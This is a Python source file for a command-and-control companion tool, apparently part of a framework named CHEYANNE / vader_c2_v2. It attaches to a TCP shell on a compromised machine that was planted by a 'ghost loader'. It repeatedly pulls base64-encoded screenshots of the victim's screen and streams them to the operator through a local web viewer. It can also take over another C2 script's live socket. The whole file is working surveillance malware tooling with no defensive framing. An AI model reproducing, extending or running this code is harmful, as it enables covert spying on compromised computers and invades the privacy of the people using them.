"""
watch_stream.py — CHEYANNE VNC-style screenshot streaming server.

Connects to an active TCP shell session (ghost loader), polls for screenshots
every 2s, serves the latest frame via HTTP for browser viewing.

Usage:
    python watch_stream.py <tcp_host> <tcp_port>
    python watch_stream.py --attach      # attach to last session from vader_c2_v2.py

Endpoints:
    /         - auto-refresh HTML viewer page
    /frame    - latest JPEG bytes
    /status   - JSON status
"""

import sys
import os
import json
import time
import socket
import threading
import base64
import argparse
import webbrowser
from http.server import BaseHTTPRequestHandler, HTTPServer

HTTP_PORT = 8892
POLL_INTERVAL = 2.0
RECV_TIMEOUT  = 10.0
RECV_BUFSIZE  = 65536

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
_frame_store = {
    "frame":      None,   # bytes — latest JPEG
    "count":      0,
    "timestamp":  None,
    "error":      None,
    "connected":  False,
}
_frame_lock = threading.Lock()

# ---------------------------------------------------------------------------
# HTML page
# ---------------------------------------------------------------------------
HTML_PAGE = """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8"/>
<title>CHEYANNE WATCH</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body {
    background:#0a0a0a; color:#00ff41; font-family:'Courier New',monospace;
    display:flex; flex-direction:column; align-items:center;
    min-height:100vh; overflow-x:hidden;
  }
  #header {
    width:100%; background:#111; border-bottom:1px solid #003300;
    padding:8px 16px; display:flex; justify-content:space-between; align-items:center;
  }
  #title { font-size:18px; font-weight:bold; letter-spacing:3px; color:#00ff41; }
  #status-bar { display:flex; gap:16px; align-items:center; font-size:12px; }
  #live-dot {
    width:10px; height:10px; border-radius:50%; background:#ff0000;
    display:inline-block; margin-right:6px;
  }
  #live-dot.live { background:#00ff41; animation:blink 1s infinite; }
  @keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0.2;} }
  #frame-counter { color:#888; }
  #ts { color:#888; font-size:11px; }
  #error-banner {
    display:none; width:100%; background:#330000; color:#ff4444;
    padding:6px 16px; font-size:12px; text-align:center;
  }
  #img-wrapper {
    flex:1; display:flex; align-items:center; justify-content:center;
    padding:16px; width:100%;
  }
  #screen {
    max-width:100%; max-height:calc(100vh - 120px);
    border:1px solid #003300; background:#111;
  }
  #placeholder {
    color:#333; font-size:14px; text-align:center; padding:80px;
    border:1px dashed #222;
  }
  #controls {
    width:100%; background:#111; border-top:1px solid #003300;
    padding:8px 16px; display:flex; gap:24px; align-items:center; font-size:12px;
  }
  label { color:#666; }
  input[type=range] { accent-color:#00ff41; width:100px; }
  #interval-val { color:#00ff41; min-width:24px; display:inline-block; }
  kbd {
    background:#222; border:1px solid #444; border-radius:3px;
    padding:1px 5px; font-size:11px; color:#999;
  }
</style>
</head>
<body>

<div id="header">
  <span id="title">&#9671; CHEYANNE WATCH</span>
  <div id="status-bar">
    <span><span id="live-dot"></span><span id="conn-txt">CONNECTING</span></span>
    <span id="frame-counter">FRAME: 0</span>
    <span id="ts">--</span>
  </div>
</div>

<div id="error-banner" id="err"></div>

<div id="img-wrapper">
  <div id="placeholder">Waiting for first frame&hellip;</div>
  <img id="screen" src="" style="display:none;" alt="screenshot"/>
</div>

<div id="controls">
  <span>
    Refresh:
    <input type="range" id="slider" min="1" max="10" value="2"
           oninput="setInterval_(this.value)"/>
    <span id="interval-val">2</span>s
  </span>
  <span>Keyboard: <kbd>s</kbd> manual shot &nbsp; <kbd>f</kbd> fullscreen</span>
  <span id="conn-detail" style="color:#444;"></span>
</div>

<script>
var intervalMs = 2000;
var timerId    = null;
var lastCount  = -1;
var isFullscreen = false;

function setInterval_(sec){
  document.getElementById('interval-val').textContent = sec;
  intervalMs = sec * 1000;
  clearInterval(timerId);
  timerId = setInterval(refresh, intervalMs);
}

function refresh(){
  var ts = Date.now();

  // Status
  fetch('/status?t=' + ts)
    .then(function(r){ return r.json(); })
    .then(function(d){
      var dot = document.getElementById('live-dot');
      var ctxt = document.getElementById('conn-txt');
      var err  = document.getElementById('error-banner');
      if(d.connected){
        dot.className = 'live';
        ctxt.textContent = 'LIVE';
      } else {
        dot.className = '';
        ctxt.textContent = 'DISCONNECTED';
      }
      document.getElementById('frame-counter').textContent = 'FRAME: ' + d.frame_count;
      if(d.last_update){
        document.getElementById('ts').textContent = d.last_update;
      }
      if(d.error){
        err.textContent = d.error;
        err.style.display = 'block';
      } else {
        err.style.display = 'none';
      }
      document.getElementById('conn-detail').textContent =
        d.target ? ('TARGET: ' + d.target) : '';
    })
    .catch(function(){});

  // Frame
  fetch('/status?t=' + ts)
    .then(function(r){ return r.json(); })
    .then(function(d){
      if(d.frame_count > 0){
        var img = document.getElementById('screen');
        var ph  = document.getElementById('placeholder');
        img.src = '/frame?t=' + ts;
        img.style.display = 'block';
        ph.style.display  = 'none';
        if(d.frame_count !== lastCount){
          img.style.outline = '2px solid #00ff41';
          setTimeout(function(){ img.style.outline = ''; }, 300);
          lastCount = d.frame_count;
        }
      }
    })
    .catch(function(){});
}

document.addEventListener('keydown', function(e){
  if(e.key === 's' || e.key === 'S'){
    fetch('/snap?t=' + Date.now()).catch(function(){});
  }
  if(e.key === 'f' || e.key === 'F'){
    if(!isFullscreen){
      document.documentElement.requestFullscreen && document.documentElement.requestFullscreen();
    } else {
      document.exitFullscreen && document.exitFullscreen();
    }
    isFullscreen = !isFullscreen;
  }
});

timerId = setInterval(refresh, intervalMs);
refresh();
</script>
</body>
</html>"""

# ---------------------------------------------------------------------------
# TCP polling
# ---------------------------------------------------------------------------

def _recv_until(conn, marker, timeout=RECV_TIMEOUT):
    """Recv from conn until marker bytes appear or timeout. Returns accumulated bytes."""
    conn.settimeout(timeout)
    buf = b""
    deadline = time.time() + timeout
    while True:
        try:
            chunk = conn.recv(RECV_BUFSIZE)
        except socket.timeout:
            break
        except OSError:
            raise
        if not chunk:
            raise ConnectionError("connection closed by remote")
        buf += chunk
        if marker in buf:
            break
        if time.time() > deadline:
            break
    return buf


def poll_screen(conn, frame_store, stop_event):
    """
    Background loop. Every POLL_INTERVAL seconds:
      - Sends  "screen\\n"  to the TCP shell
      - Reads until [/SCR] marker
      - Decodes base64 JPEG between [SCR] ... [/SCR]
      - Updates frame_store in-place (under _frame_lock)

    frame_store keys: frame, count, timestamp, error, connected
    """
    frame_store["connected"] = True
    while not stop_event.is_set():
        try:
            conn.sendall(b"screen\n")
            raw = _recv_until(conn, b"[/SCR]")

            start = raw.find(b"[SCR]")
            end   = raw.find(b"[/SCR]")
            if start == -1 or end == -1:
                with _frame_lock:
                    frame_store["error"] = "Marker not found in response"
                time.sleep(POLL_INTERVAL)
                continue

            b64_data = raw[start + 5 : end].strip()
            jpeg_bytes = base64.b64decode(b64_data)

            with _frame_lock:
                frame_store["frame"]     = jpeg_bytes
                frame_store["count"]    += 1
                frame_store["timestamp"] = time.strftime("%Y-%m-%d %H:%M:%S")
                frame_store["error"]     = None
                frame_store["connected"] = True

        except ConnectionError as e:
            with _frame_lock:
                frame_store["error"]     = f"TCP error: {e}"
                frame_store["connected"] = False
            break
        except Exception as e:
            with _frame_lock:
                frame_store["error"] = f"Poll error: {e}"

        time.sleep(POLL_INTERVAL)

    with _frame_lock:
        frame_store["connected"] = False


def _request_snap(conn):
    """Manually trigger one screenshot (called from /snap endpoint)."""
    try:
        conn.sendall(b"screen\n")
    except Exception:
        pass


# ---------------------------------------------------------------------------
# HTTP handler
# ---------------------------------------------------------------------------

class WatchHandler(BaseHTTPRequestHandler):
    tcp_conn = None       # set after construction via class attr
    target   = ""

    def log_message(self, fmt, *args):
        pass  # silence access log

    def do_GET(self):
        path = self.path.split("?")[0]

        if path == "/":
            self._serve_html()
        elif path == "/frame":
            self._serve_frame()
        elif path == "/status":
            self._serve_status()
        elif path == "/snap":
            self._serve_snap()
        else:
            self.send_error(404)

    def _serve_html(self):
        body = HTML_PAGE.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", len(body))
        self.end_headers()
        self.wfile.write(body)

    def _serve_frame(self):
        with _frame_lock:
            frame = _frame_store.get("frame")
        if frame is None:
            self.send_error(503, "No frame yet")
            return
        self.send_response(200)
        self.send_header("Content-Type", "image/jpeg")
        self.send_header("Content-Length", len(frame))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(frame)

    def _serve_status(self):
        with _frame_lock:
            data = {
                "frame_count": _frame_store["count"],
                "last_update": _frame_store["timestamp"],
                "connected":   _frame_store["connected"],
                "error":       _frame_store["error"],
                "target":      self.__class__.target,
            }
        body = json.dumps(data).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", len(body))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def _serve_snap(self):
        conn = self.__class__.tcp_conn
        if conn:
            _request_snap(conn)
        self.send_response(204)
        self.end_headers()


# ---------------------------------------------------------------------------
# Public API — attach from vader_menu.py
# ---------------------------------------------------------------------------

def watch_session(tcp_conn, target_label="unknown", http_port=HTTP_PORT):
    """
    Called from vader_menu.py with an existing open socket.
    Starts the HTTP server and poll thread. Blocks until KeyboardInterrupt.

    Args:
        tcp_conn    : socket.socket — already-connected TCP session
        target_label: str — shown in the UI status bar
        http_port   : int — HTTP port to listen on
    """
    WatchHandler.tcp_conn = tcp_conn
    WatchHandler.target   = target_label

    stop_event = threading.Event()
    poll_thread = threading.Thread(
        target=poll_screen,
        args=(tcp_conn, _frame_store, stop_event),
        daemon=True,
        name="poll-screen",
    )
    poll_thread.start()

    server = HTTPServer(("0.0.0.0", http_port), WatchHandler)
    url = f"http://127.0.0.1:{http_port}"
    print(f"[WATCH] Serving on {url}")
    webbrowser.open(url)

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[WATCH] Stopped.")
    finally:
        stop_event.set()
        server.server_close()


# ---------------------------------------------------------------------------
# --attach mode: grab last socket from vader_c2_v2.py module if available
# ---------------------------------------------------------------------------

def _attach_last_session():
    """Try to import vader_c2_v2 and steal its last active socket."""
    try:
        # vader_c2_v2 should export: active_conn = socket object or None
        import importlib.util, pathlib
        here = pathlib.Path(__file__).parent
        spec = importlib.util.spec_from_file_location(
            "vader_c2_v2", here / "vader_c2_v2.py"
        )
        if spec is None:
            raise ImportError("vader_c2_v2.py not found")
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        conn = getattr(mod, "active_conn", None)
        if conn is None:
            raise ValueError("vader_c2_v2.active_conn is None — no active session")
        return conn, getattr(mod, "active_target", "attached")
    except Exception as e:
        print(f"[WATCH] --attach failed: {e}")
        sys.exit(1)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="CHEYANNE watch_stream — VNC-style screenshot viewer for TCP shell sessions"
    )
    parser.add_argument("host",  nargs="?", help="TCP host to connect to")
    parser.add_argument("port",  nargs="?", type=int, help="TCP port")
    parser.add_argument("--attach", action="store_true",
                        help="Attach to last active vader_c2_v2.py session")
    parser.add_argument("--http-port", type=int, default=HTTP_PORT,
                        help=f"HTTP server port (default {HTTP_PORT})")
    args = parser.parse_args()

    if args.attach:
        conn, label = _attach_last_session()
        print(f"[WATCH] Attached to existing session: {label}")
    elif args.host and args.port:
        print(f"[WATCH] Connecting to {args.host}:{args.port} ...")
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn.connect((args.host, args.port))
        label = f"{args.host}:{args.port}"
        print(f"[WATCH] Connected.")
    else:
        parser.print_help()
        sys.exit(1)

    watch_session(conn, target_label=label, http_port=args.http_port)


if __name__ == "__main__":
    main()
